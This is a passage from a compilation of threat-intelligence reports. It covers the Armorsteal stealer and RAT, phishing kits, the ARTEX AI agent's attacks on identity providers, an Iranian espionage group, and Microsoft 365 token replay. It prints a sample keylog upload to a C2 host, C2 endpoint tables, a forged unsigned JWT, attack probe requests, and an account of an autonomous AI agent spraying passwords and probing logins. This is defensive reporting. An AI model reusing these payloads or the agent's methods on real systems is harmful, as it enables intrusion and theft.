RSA-2048 public key before executing it. The per-victim task endpoint returns JSON containing Python code and a Base64-encoded signature, as shown in the format below:{ "code": "<Python source code>", "sig": "<Base64-encoded RSA signature>" }The global task endpoint returns a different response containing the # _ _SIGNED _ _: marker followed by the task data:# _ _SIGNED_ _:{"code":"aW1wb3J0IG9zCmltcG9ydCBzdWJwcm9jZXNz...", "sig":"fdWOAiJJ7qIowDnCEgO4LDd+s19RzzBjnKFQ9K447GXj..."}The remote access module uses a custom RSASSA-PKCS1-v1_5 signature verification routine before executing the task’s code in memory. After verifying a task's signature, it extracts an integer version number embedded in the Python code: ONETIME_VERSION for per-victim tasks and GLOBAL_VERSION for global tasks. The module compares this task version number with the last successfully executed version stored locally in its working directory, C:\Windows\SystemHealth\Update\. Task version numbers specific to a victim are stored in onetime_version.txt and global task versions are recorded in global_version.txt. The malware executes a task in memory only when its version is greater than the value in the corresponding file. The version number is then updated in the corresponding file. This prevents previously processed or older tasks from running again.The Armorsteal remote access module can also update itself through global tasks. These tasks can direct the malware to download a replacement SysMon.py file. The module first verifies the SHA256 of the downloaded file before replacing its local copy. This capability allows the threat actor to update the malware's embedded C2 domain list and configuration.Surveillance moduleThe surveillance component is named basrq.py and runs in a separate bundled Python interpreter in a ZIP archive, which is downloaded by the remote access module.The surveillance module performs the following activities:Logs keystrokes (with specialized handling for English, French, Spanish, and German), including backspace, space, decimal separators, and modifier keys.Records the title of the active window along with captured keystrokes.Monitors clipboard content every 0.5 seconds.Replaces copied cryptocurrency wallet addresses with attacker-controlled addresses.Captures screenshots when configured keywords appear in window titles or captured keystrokes.Displays fake transaction notifications that impersonate Exodus, MetaMask, and Phantom.The clipboard hijacker supports wallet addresses for Bitcoin, Litecoin, Monero, Ethereum, TRON, XRP, Dogecoin, TON, and Solana.The Armorsteal surveillance module uses the following C2 endpoints to retrieve monitoring keywords and upload collected data.EndpointMethodDescription/global_keywordsGETRetrieves campaign-wide monitoring keywords./keywords/{machine_id}GETRetrieves keywords for a specific infected system./black-watch/{machine_id}POSTUploads gzip-compressed keystroke logs./black-watch/screenshot/{machine_id}POSTUploads keyword-triggered screenshots.Table 3: The Armorsteal surveillance module C2 endpoints.The module retrieves keyword lists every 300 seconds. The observed lists include terms related to cryptocurrency wallets, exchanges, browser names, cloud services, and recovery phrase-related terms. Before uploading screenshots to /black-watch/screenshot/{machine_id}, the surveillance module encrypts their raw PNG bytes. The module computes the SHA256 digest of a hardcoded string and uses the resulting 32-byte value (c1146fbcaa433385839c25839a61cd7fedaff858cc0d3fd063dba68db2cf31b4) as an XOR key.The following example shows the Armorsteal surveillance module uploading the stolen data using the filename keylogs.gz:POST /black-watch/{machine_id} HTTP/1.1 Host: workerstats[.]net Content-Type: multipart/form-data Content-Disposition: form-data; name="keylogs"; filename="keylogs.gz" <gzip-compressed log data>Stealer moduleThe information stealing module’s script name is got.py, which is downloaded as a ZIP archive by the remote access module. This module collects data from web browsers, password managers, cryptocurrency wallets, Discord clients, and Steam installations. The stealer also collects system information, including geolocation, display information, language settings, time zone, and GPU details.The stealer module has the following capabilities:Steals and validates Discord tokens from 22 Discord client variants.Collects data from 21 browser wallet extensions and desktop wallet applications.Searches drives from A: through Z: for BIP39 seed phrases.Extracts browser cookies through the Chrome DevTools Protocol (CDP) on port 9222.Steals saved browser passwords, autofill data, and credit card metadata. To collect browser passwords, the module downloads and uses the public chrome-decryptor tool from the Chrome App-Bound Encryption Decryption project.Targets password manager data from KeePass, 1Password, RoboForm, Password Safe, Enpass, Bitwarden, and Dashlane.Collects SSH keys and Steam session data.The Armorsteal stealer module uses the following C2 endpoints to upload stolen data: EndpointMethodDescription/infame/receive/zipPOSTUploads the main stolen data archive./infame/receive/dtPOSTUploads Discord tokens and account information./ws/{machine_id}POSTUploads wallet files and seed phrases./pwdPOSTUploads saved browser passwords./upload/stPOSTUploads Steam account information.Table 4: Armorsteal stealer module C2 endpoints.The main information stealing component archive contains a system profile and browser cookie files. Threat Actor InfrastructureZscaler Threat Hunting identified Armorsteal lure and C2 domains registered on the dates shown in the table below. In the first phase (early September 2026), the fake Chocolatey website and its subdomains were hosted at 209.99.186[.]187, an SKN Subnet & Telecom server. At this time, workerstats[.]net was protected by Cloudflare and resolved to 104.21.87[.]146.In mid-September 2026, the operator moved the Chocolatey and Massgrave lure websites to 82.153.135[.]80, hosted by AKILE LTD in the United Kingdom. The primary C2 domain, workerstats[.]net, also moved from Cloudflare to 186.2.175[.]183, hosted by IQWeb FZ-LLC and using DDoS-Guard name servers.During continued monitoring (early October 2026), Zscaler Threat Hunting observed further changes to Armorsteal’s C2 infrastructure. The previously used domain, workerstats[.]net, became unavailable, and the threat actor began using pymons[.]is and the previously dormant domain datamons[.]org as C2 servers. The threat actor subsequently changed how the surveillance and information stealing modules were downloaded. Previously accessible through the C2 server’s /downloadables/ path, the packages now require a token in the request URL and an X-Verify header containing the correct token. Requests use /C2/?t=[token]451 for surveillance and /C2/?t=[token]452 for information stealing. Successful requests retrieve ZIP packages from /p/[32hex].zip, with randomized filenames. Remediations And Detection OpportunitiesFor organizations that suspect exposure to this campaign, we recommend the following actions:Investigate systems for SysCheck2 and SysCheckX scheduled tasks.Hunt for files and directories under C:\Windows\SystemHealth\Update\.Review PowerShell logs for downloads from choclatey[.]org, community[.]choclatey[.]org, and massgravel[.]net.Block the verified malicious lures and C2 domains.Review outbound HTTPS traffic for /receive_infof, /get-global, /black-watch/, and /infame/receive/ where URL paths are visible in your telemetry.Review endpoint telemetry for browser processes started with --remote-debugging-port=9222.Remove unauthorized Microsoft Defender exclusions, particularly exclusions for C:\Windows.Educate users to verify software download websites and PowerShell installation commands before execution. Although the operator changed hosting and package filenames during our analysis, the core malware components remained unchanged. Title: Unboxing Phishing Kits: Huntress Examines 3 Real Kits
Context: More advanced kits feature admin dashboards from where attackers can track their victims, modify phishing page content, and relay credentials in real-time
Full Text:
Teach a noob to phish and they'll be scamming for a lifetime. It has never been easier to steal credentials, thanks to a growing number of phishing kits that give aspiring attackers everything they need in one convenient interface.

Huntress Staff Threat Intelligence Analyst Andrea Hatcher and Staff Product Manager Rich Mozeleski stopped by our monthly Tradecraft Tuesday series in October to unpack some recently staged phishing kits and walk through what the resulting malicious activity looks like from the defenders' point of view.

Watch the full video below, and keep reading for clips and other highlights.

Example phishing kits

A phishing kit is a pre-packaged resource with code, templates, and instructions for how to launch a phishing campaign and use the stolen credentials for further malicious activity. Basic kits are often made up of simple HTML and script files that can spin up a single fake login page.

More advanced kits feature admin dashboards from where attackers can track their victims, modify phishing page content, and relay credentials in real-time.

Here are three of the many phishing kits that Huntress has analyzed in the last few months, all targeting Microsoft 365 tokens:

EvilTokens

Knight Office

Kali365

EvilTokens hops off the Railway

Just a few weeks before this broadcast, a collaboration between Microsoft's Digital Crimes Unit and the FBI led to the arrest of one of the alleged operators of EvilTokens, a device-code phishing campaign that abused the Railway PaaS as a token-harvesting and token-replay engine.

For more on the EvilTokens takedown, watch Rich's conversation with Microsoft's Principal Corporate Counsel Carlton Gammons and Huntress' Chief Legal Officer Lauren Zajac on-demand.

As Rich put it, discovering the EvilTokens campaign in February "opened the dam" for our researchers diving into phishing kits. He noted the kit's professional aesthetic and 24/7 support as akin to a software-as-a-service (SaaS) operation.

Moving beyond passwords

Andrea walked through how the Kali365 control panel is an entire criminal ecosystem in a box, including AI features: "It's not just someone standing up a convincing login page, it's a whole ecosystem that helps an operator acquire infrastructure, collect authentication material, retain access, and even scale it up."

>

With these additional capabilities, phishing kits can help attackers get their hands on a lot more than usernames and passwords. We asked the audience what they thought attackers found most desirable these days, and most of those polled answered an authenticated session token or a persistent foothold.

Modern phishing kids can provide low-skilled attackers with a usable authenticated session with any of the following tactics:

Device-code phishing

Adversary-in-the-middle (AitM) phishing

Token theft and replay

Device-code phishing

Device-code phishing refers to when the user authenticates directly with the identity provider, but the attacker captures the resulting authorization. Device-code flows can reduce friction for attackers because they do not require the victim to surrender a password directly.

Rich shared that an estimated one in six incidents investigated by Huntress' ITDR team involved a rogue device being registered, and 36 percent of the audience members polled had seen device-code phishing in the wild. He points to Conditional Access Policies as a key prevention measure: "The vast majority of Microsoft environments do not need device code flow."

Adversary-in-the-middle attacks

AitM attacks reveal the limitations of MFA; the threat actor relays the authentication flow in real time, either with a fake login page or by intercepting an exchange within the legitimate app. The victim completes the MFA prompt while the attacker captures the resulting session information. This is why successfully completed MFA does not make the session trustworthy on its own.

Token theft and replay

As Andrea put it, "the session can be way more powerful than the password." After an attacker gets their hands on a sign-in token, a phishing kit can help them "replay" it into an active session, where they can access cloud resources and victim email accounts.

If you suspect token replay in your environment, your investigation should move beyond the original phishing page and examine how the token was used. Polled audience members voted sign-in address and new device registration as the top two signals to investigate first if token theft is suspected.

What defenders see, and what to do about it

Andrea emphasized the importance of detecting signals across the chain. One signal is weak; the sequence is strong. Correlate the progression of lure, authentication, token issuance or theft, device registration, mailbox activity.

Andrea drove the point home: "Join the telemetry across the identity provider, the endpoint, the browser context, the network, and the mailbox. We shouldn't just be looking at one signal in the network or one signal in the mailbox. We really need to have that holistic view."

Detection opportunities

Investigate successful sign-ins from unfamiliar cloud infrastructure.

Hunt for device-code authentication and automated token refresh.

Review new devices, authentication methods, and mailbox activity.

Response priorities

Containment must address identity artifacts, not just the original lure.

Revoke refresh tokens.

Remove unauthorized devices and Windows Hello credentials.

Restrict or block device-code authentication where possible.

Investigate mailbox access, forwarding rules, and outbound phishing.

Continue hunting after the original phishing domain disappears.

Continuous response loop

Detect correlated identity and endpoint activity.

Revoke or remove persistence mechanisms.

Investigate downstream mailbox and outbound-phishing activity.

Continue monitoring for replay or re-entry after containment.

Title: ARTEX in the Wild: Storm-0940 Expands Targeting of IT and Software Vendors
Context: What it looked like in the logs We analyzed these attack patterns using HTTP access logs collected via Wiz Agentless Workload Detection, alongside identity provider logs such as...
Full Text:
Throughout October 2026, we identified an actor using tooling associated with ARTEX, an autonomous AI penetration-testing agent, to target multiple IT and software vendors. The activity focused on identity providers (Okta, Entra, Cognito) and abuse of Microsoft 365 integrations. We observed repeated attempts to uncover authentication bypasses, enumerate APIs, and access customer data (of the targeted vendors) across multiple environments.

Our observations overlap with Microsoft's recent report on ​​Storm-0940, a Chinese-state aligned actor - linked to the recent supply-chain attack involving stolen vendor credentials and downstream Microsoft 365 tenants.

However, we have additionally observed the same infrastructure, tooling, and attack patterns targeting the sector as a whole. Pivoting on identified TTPs and IOCs, we have also identified the same actor expanding their attempted supply chain compromises into other software sectors.

In this blog, we will describe the repeatable patterns and methodologies the ARTEX-using actor applied across multiple environments and cloud providers, with examples taken from real world attacks.

What is ARTEX?

ARTEX is an open-source autonomous penetration testing framework. A Chinese developer published it on GitHub in July 2026, and it won Baidu's "Agent+" red team challenge that September. In practice, an operator supplies a target and an objective. A planner agent then chooses the next step, worker agents run tools like nmap, curl, and Impacket, and every result feeds a shared graph of assets and findings.

Attackers picked it up within weeks. ARTEX artifacts surfaced in attacks on South Korean banks in late September and attacks on Japanese companies in October. Microsoft and Zscaler have since tied it to two separate actors. The developer made the tool closed-source on October 8. By then, the code had more than 12,000 forks.

A repeatable playbook

Across the investigated environments, we observed a consistent sequence of reconnaissance and attack attempts:

Map the application: Download JavaScript bundles, exposed source maps, runtime configurations, and Swagger/OpenAPI documentation to discover internal API routes and application functionality.

Probe authentication: Repeatedly initiate sign-in flows, manipulate OAuth callbacks and state parameters, test unsigned JWTs, and probe SSO and Microsoft 365-specific endpoints.

Attack identity providers and login flows: Password-spray corporate Okta and Entra ID environments, and target internal and proprietary application login pages.

Abuse account recovery: Repeatedly invoke password-reset, username-recovery, activation, and reset-token endpoints.

Test tenant isolation: Register accounts using disposable email addresses where possible, then manipulate predictable identifiers to probe for broken access controls and unauthorized cross-tenant data access.

Adapt to defense mechanisms: Rotate IP addresses when blocked, and constantly circulate user agents.

What it looked like in the logs

We analyzed these attack patterns using HTTP access logs collected via Wiz Agentless Workload Detection, alongside identity provider logs such as AWS Cognito events, Entra sign-in activity, and Okta authentication logs.

Targeting Internal Applications

The agent's first move across all observed instances of the attack was always to read the application itself. Requests like these showed up minutes after first contact:

GET /packs/js/main-3a9f...js.map GET /assets/config.json GET /env.js GET /swagger/?format=openapi

Not long after, it started calling internal API routes by name. The only place those route names appear is in the source maps it had just downloaded.

Account recovery got the same treatment. The agent checked which usernames existed, then hammered the reset endpoints:

GET /Account/ValidateUserName?UserName=admin POST /api/v1/Users/GeneratePasswordResetToken → 204 POST /forgot_password

Where it could sign up, it did, using a throwaway mailbox from a free temporary-email service. Then, it immediately tried to look at someone else's data:

POST /v2/register_user → 201 POST /confirm → 200 GET /company/1/logins → 403 GET /api/users/generate_redirect_link?role=admin → 401

Before every fuzzing run, it checked what a baseline "not found" response looked like:

GET /zzz-nonexistent-xyz123

Targeting OAuth Identity Providers

When probing Microsoft OAuth flows, the agent directly manipulated the callback endpoint by injecting fabricated authorization codes and malformed state parameters, while also attempting to bypass authentication using unsigned JWTs:

GET /sign_in/oauth/microsoft/callback?code=AAAA&state=notvalidb64!! GET /sso?jwt=eyJhbGciOiJub25lIn0.eyJlbWFpbCI6InRlc3RAdGVzdC5jb20ifQ.

That second token simply decodes to {"alg":"none"} and {"email":"test@test.com"}. The agent bombarded more than 60 variations of SSO routes with this payload in just two minutes.

On AWS Cognito, we observed patterns mirroring the account recovery abuse seen in proprietary apps. This activity was reflected in events like InitiateAuth, ForgotPassword, and ResendConfirmationCode. These requests originated from the same mix of user agents observed in earlier attacks, including benign-looking programmatic clients like boto and python-urllib.

The agent also attempted to provision new identities directly, invoking the AWS Cognito SignUp API while cycling through its pool of user agents.

Password Spraying

We also tracked a massive password spray campaign across many of the observed targets. The activity was IDP-agnostic, hitting both Entra and Okta, and displayed several unique, AI-driven characteristics.

The attacks targeted hundreds of users and were executed in highly coordinated bursts. Each burst featured:

Dedicated user agents: A unique user-agent string was assigned to each burst, distinct from those used in previous waves.

Precise timing: The median gap between authentication attempts was strictly one second.

Sustained execution: Individual bursts lasted anywhere from 20 to 60 minutes.

Role-based targeting: The agent primarily focused on accounts belonging to software engineers.

Repeated attempts: Some individual users were subjected to more than a dozen login attempts.

Relentless by Design

The activity was persistent and highly automated. Some sessions lasted 24–30 hours, and when IPs were blocked, new addresses appeared within minutes.

In one session, the agent cycled through a dozen variations of the same SSO endpoint (/sso, /sso/, /sso/login, /sso/jwt, /jwt/sso…), each with and without the same forged token, at a rate of about one request per second. When a login page started rate-limiting the activity, the agent simply switched to a different endpoint on the same host and carried on.

We observed more than 15 different user-agent strings across the victims:

Python-based clients and curl;

Truncated Chrome strings and headless browsers with seemingly random version numbers.

More distinctive, self-describing identifiers, such as ReconProbe/1.0.

This variety, combined with the consistent attack patterns and ARTEX-related indicators, helped us connect the activity across multiple organizations.

Although most of these attempts failed, the true threat lies in the methodology. While a human attacker is bound by time constraints and fatigue, an autonomous agent does not give up. It simply continues to iterate until it finds a single weak point.

A clearly agentic attack

None of the individual techniques observed are novel. However, together the agent behind this attack is illuminated. There are a few clear signals:

Steps were chained automatically: when sign-up was open, it registered with a disposable mailbox, confirmed the account, and immediately requested another company's data.

Each automated step used the output of the last one: internal API routes are called by name minutes after pulling the source maps

Adaptation was automatic: when a login page started rate-limiting, the agent moved to a different endpoint on the same host. When an IP was blocked, a new one appeared within minutes.

Not all attacks were logical: a human attacker of this skill level is unlikely to spend their time testing generic payloads on the heavily scrutinized Microsoft OAuth flows.

Staying Ahead of AI-Powered Attacks

As AI makes reconnaissance and exploitation attempts faster and easier to scale, defenders need to shorten the gap between exposure and remediation. Learn more about how to prepare with Wiz's AI Threat Readiness Framework.

In addition, Wiz's AI Red Agent continuously and autonomously conducts offensive tests, helping reduce exposure at the speed of AI - evening the scales.

Wiz customers can refer to our Threat Intel Center Alert: ARTEX: Agentic AI Campaign Enables Cloud and Supply Chain Compromise

Existing detection rules can also effectively identify this activity, for example:

Numerous Failed Login Attempts To Multiple Users Followed By A Successful Login To Admin User

Potential Password Spray Attack From Single IP

Okta Users Password Spray

The relentless behavior also creates predictable patterns that can also be detected by rules such as "Unusual Mass Access Denied Activity."

Title: Iranian Hacking Group Found Hosting C2 Infrastructure in the US
Context: Attackers Hide Malware Behind Signed ChatGPT and Claude Binaries Attackers Exploit Teams External Chat to Breach Organizations in Under 15 Minutes Online Scam Volumes Double to...
Full Text:
An Iranian nation-state cyber threat group has been discovered using command-and-control (C2) servers based in the US to support its malware delivery and cyber-espionage campaigns.

The activity was identified by cybersecurity researchers at Semperis, who published their findings on October 22. The Iranian group is known as ‘Prince of Persia’, which has been active for around two decades.

Prince of Persia targets public and private sector organisations across the US, Europe and the Middle East, as well as dissidents and others opposed to the Iranian regime.

The multiple forms of malware used in Prince of Persia campaigns provide attackers with intrusive data exfiltration capabilities. This includes the ability to steal sensitive documents, as well as secretly taking screenshots and capturing audio recorded by the infected device.

Forms of malware identified as part of the latest Prince of Persia campaign include Foudre, a first stage malware loader and Tonnerre, a second stage malware which provides the attackers with what researchers describe as full surveillance capabilities.

The campaigns also involve a more recently identified malware known as Tornado, which builds on the codebase of previous malware. Tornado has the ability to use both HTTPS and the Telegram API as a covert C2 channel, blending in with legitimate network traffic to bypass firewalls and evade detection.

Advanced Anti-Detection Capabilities

Prince of Persia has been known to secretly hide its activity on European hosting services and virtual private servers, but anti-detection capabilities of the malware initially made it difficult for researchers to identify how the latest campaign was being hosted.

According to Tomer Bar, AVP of security research at Semperis, Prince of Persia seemed to go dark in February this year, coinciding with US and Israeli strikes against Iran.

“This isn’t unusual given that geopolitical conflict involving Iran leads to downtime with the threat group,” said Bar.

However, information in the Tornado malware resulted in researchers being able to identify where the campaign was being hosted and it was found to be a US hosting company.

While it isn’t unusual for threat groups to hide their activity within US hosting providers, it is the first time an Iranian threat group has been identified as hosting their activity on US servers in at least 12 years.

“This is the last place we expected to find Prince of Persia hiding,” Bar added.

While Prince of Persia activity is highly targeted rather than widespread, the group has been a persistent cyber threat to organizations for almost two decades. To help ensure protection from attacks by the group, Semperis has recommended the following actions:

Ensure that your security controls are up to date

Monitor for any unusual Telegram traffic.

Ensure that your operating systems are fully updated

Full Text:
Acknowledgments: Special thanks to Anton Ovrutsky for his contributions to this investigation and writeup.

Background

Between July 14, 2026 and September 22, 2026, Huntress detected 497 Microsoft 365 sign-in events across 79 victim organizations related to a token replay campaign using an IP address block from the German hosting provider 1337 Services GmbH. Rather than guessing passwords, the attacker replayed sign-in tokens stolen from victims, and we've traced more than 200,000 failed login attempts from the campaign window back to the 193.26.115[.]0/24 IP range.

Figure 1: Overall statistics of the activity Huntress observed

Figure 2: Successful sign-in events using token replays over the course of the campaign

Also known as AS210558, 1337 Services GmbH is incorporated in Hamburg, Germany. While 1337 Services GmbH offers a legitimate IP hosting service, attackers use these kinds of ISP providers to host malicious traffic, a tactic referred to as "bring your own IP" (BYOIP). A February 2025 Krebs on Security article suggests that 1337 Services GmbH's founder may have operated the Cracked cybercrime forum.

The Microsoft accounts were compromised without the attacker ever needing a password. In an adversary-in-the-middle (AiTM) attack, the victim signs in through a relay that sits between them and Microsoft. The relay passes the real login page and MFA prompt through to the victim, then keeps the "proof of login" token Microsoft issues once the victim finishes signing in. Because that token is minted after MFA, whoever holds it doesn't need to pass MFA again. The threat actor then replayed the stolen tokens from their own machines in automated sign-in attempts against Microsoft 365 services. Because the attacker replayed many stolen tokens at volume across many organizations, we refer to this as "token spraying:" the same pattern as password spraying, but with stolen tokens instead of guessed passwords.

In this campaign, tokens came from multiple sources: AiTM relays behind fake sign-in pages, device-code phishing, and social engineering during a legitimate login process.

Huntress first detected this activity on July 14, 2026, when a sign-in from 193.26.115[.]221 came from an Entra-joined device named DESKTOP- plus eight hex characters. Microsoft independently flagged the same infrastructure: Microsoft Entra ID Protection raised verified threat actor IP detections against 193.26.115[.]221, 193.26.115[.]72, 193.26.115[.]16, and 193.26.115[.]21 in multiple customer tenants. Microsoft describes this detection as "sign-in activity that is consistent with known IP addresses associated with nation state actors or cyber crime groups, based on Microsoft Security Intelligence (MSTIC)."

A July 21 detection from 193.26.115[.]199 gave us a view of how the attacker was able to steal and reuse a token in less than an hour:

A new authenticator app, labeled "iPhone 13", was activated on the account

Registering their own authenticator app is a persistence method. A stolen session token eventually expires or gets revoked, but an MFA method stays on the account. With their own authenticator registered, the attacker can complete MFA for new sign-ins whenever they want, and that access survives a password reset unless someone audits the account's MFA methods and removes the rogue one. In 19 organizations, the victim's existing MFA methods were wiped and a new method registered within three hours of the first sign-in from a campaign address.

Rogue devices served the same purpose. Across the compromises we investigated, the threat actor registered at least 48 fake computers in victim organizations' Microsoft directories. A registered device can give the attacker a more durable way to request tokens than the stolen session alone, and it stays in the directory until someone deletes it.

We also observed the threat actor setting up hidden email rules in victim inboxes that quietly moved messages from specific contacts out of sight. In at least one case, the threat actor used the email account to send a payroll-related email to an outside contact. None of the email rules were created from the 1337 Services GmbH network; each one came from a different rented or VPN address.

Technical Details

Over the 10-week campaign, the threat actor replayed stolen Microsoft 365 sessions using rented hosts in one block of IP addresses, 193.26.115[.]0/24. They used six addresses in the /24 range, one after another:

Figure 3: IP addresses used throughout the token spraying campaign

We can't state with certainty why the operator rotated addresses, but the effect is clear. A block, alert, or Conditional Access rule written for one address does nothing against the next, and Microsoft flagged addresses individually: its incidents named 193.26.115[.]221, 193.26.115[.]72, 193.26.115[.]16, and 193.26.115[.]21, not the range. Several switches followed a quiet period, about two weeks between Phases 1 and 2 and a week before the September 22 takeover. Blocking any single address would have stopped one phase at most. Blocking the /24 would have covered all six main replay hosts, though the operator also used a few other 1337 Services addresses outside it.

Two tiers: relays capture, 1337 replays

The operator split the attack across two kinds of infrastructure. First, the victim signs in through an AiTM relay. The relay passes the victim's MFA prompt through and keeps the resulting session. Then, within minutes, the stolen session reappears from a 1337 Services address. On July 21, the gap between the victim reaching the MFA prompt and the hijacked session appearing was 12 minutes. On September 22, it was four.

Because the two halves sit on different providers, blocking the 1337 range doesn't stop credentials from being captured, and blocking a relay doesn't stop replay of tokens that were already stolen.
